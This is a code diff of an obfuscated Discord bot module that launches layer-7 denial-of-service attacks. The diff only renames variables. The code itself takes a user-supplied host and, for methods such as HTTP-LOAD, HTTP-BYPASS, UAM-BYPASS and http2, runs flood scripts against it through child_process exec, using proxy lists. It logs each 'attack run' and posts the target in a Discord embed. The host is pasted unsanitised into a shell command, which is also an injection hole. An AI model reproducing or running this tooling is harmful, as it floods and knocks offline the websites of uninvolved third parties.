@@ -68,11 +68,11 @@ module['exports'] = {
             })
         };
         const _0xf396x9 = _0xf396x8['options']['getString']('methods');
-        const _website = _0xf396x8['options']['getString']('host');
+        const website = _0xf396x8['options']['getString']('host');
             if (_0xf396x9 === 'BASIC-KID') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -80,7 +80,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -114,9 +114,9 @@ module['exports'] = {
             })
         }
         if (_0xf396x9 === 'HTTP-LOAD') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -124,7 +124,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -157,9 +157,9 @@ module['exports'] = {
                 }, 3000)
             })
         }if (_0xf396x9 === 'raw') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -167,7 +167,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -201,9 +201,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'HTTP-MAX') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 5 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 5 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -211,7 +211,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -245,9 +245,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'HTTP-BYPASS') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -255,7 +255,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -289,9 +289,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'UAM-BYPASS') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 120 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 120 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -299,7 +299,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -333,9 +333,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'HTTP-STORM') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -343,7 +343,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -375,9 +375,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'HTTP-OFF') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 off 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 off 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -385,7 +385,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -419,9 +419,9 @@ module['exports'] = {
             })
         }
         if (_0xf396x9 === 'http2') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/http2'}${_method}${'.js '}${_website}${' 10 60 proxynofilter.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node basic/L7/http2'}${method}${'.js '}${website}${' 10 60 proxynofilter.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -429,7 +429,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
